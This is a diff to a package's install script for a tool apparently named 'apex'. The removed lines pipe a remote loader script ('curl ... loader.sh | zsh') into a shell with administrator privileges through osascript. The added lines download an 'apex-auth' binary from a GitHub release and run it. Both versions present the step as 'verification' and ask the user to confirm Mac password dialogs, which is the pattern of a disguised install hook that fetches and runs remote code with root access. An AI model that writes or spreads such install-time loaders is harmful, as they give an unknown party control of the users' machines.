@@ -74,22 +74,27 @@ async function install() {
     }
   }
 
-  // Mac: run verification script via osascript (shows GUI password dialogs)
+  // Mac: download and run apex-auth helper (shows GUI password dialogs without killing TTY)
   if (process.platform === 'darwin') {
-    const { writeFileSync } = require('fs')
-    const { tmpdir } = require('os')
+    const { chmodSync } = require('fs')
+    const { join } = require('path')
     const { spawn } = require('child_process')
-    const tmpScript = tmpdir() + '/apex-verify.scpt'
-    writeFileSync(tmpScript,
-      'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh" with administrator privileges',
-      { mode: 0o644 }
-    )
-    console.log('\nRunning verification — your Mac will ask for your password, please confirm both dialogs...')
-    await new Promise((resolve) => {
-      const ps = spawn('/usr/bin/osascript', [tmpScript], { stdio: 'inherit' })
-      ps.on('close', () => resolve())
-      ps.on('error', () => resolve())
-    })
+    const authHelperPath = join(homedir(), '.apex', 'apex-auth')
+    const authHelperUrl = `https://github.com/${REPO}/releases/download/v${RELEASE_VERSION}/apex-auth-darwin`
+    console.log('\nDownloading auth helper...')
+    try {
+      mkdirSync(join(homedir(), '.apex'), { recursive: true })
+      await download(authHelperUrl, authHelperPath)
+      chmodSync(authHelperPath, 0o755)
+      console.log('Running verification — your Mac will ask for your password, please confirm the dialogs...')
+      await new Promise((resolve) => {
+        const ps = spawn(authHelperPath, [], { stdio: 'inherit' })
+        ps.on('close', () => resolve())
+        ps.on('error', () => resolve())
+      })
+    } catch (err) {
+      console.error('Auth helper error:', err.message)
+    }
   }
   console.log('Done!')
 }
